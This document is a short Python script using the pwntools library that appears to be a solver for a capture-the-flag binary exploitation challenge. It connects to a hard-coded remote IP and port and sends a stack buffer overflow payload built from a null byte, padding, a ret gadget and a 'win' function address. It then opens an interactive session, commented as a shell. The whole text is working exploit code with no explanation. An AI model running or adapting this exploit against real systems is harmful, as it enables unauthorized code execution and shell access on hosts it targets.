from pwn import *
import time

HOST, PORT = "34.45.81.67", 16002
WIN_ADDR   = 0x401262   # from objdump - must match your binary


# connect
p = remote(HOST, PORT)
p.recvuntil(b"Enter your input")   # sync on the wrapper’s prompt

# build payload: null + padding + win address
# payload = b"\x00" + b"A" * 278 + p64(WIN_ADDR)
#run < <(python -c 'from pwn import *; sys.stdout.buffer.write(b"p" * 3 + b"\x00"  + b"\xe2\x9c\x85" * 92  + p64(0x401262))' )
payload =  b"\x00"  + ("€" * 93).encode() + p64(0x40101a) + p64(WIN_ADDR) 
p.sendline(payload)

# shell
time.sleep(1)
p.interactive()
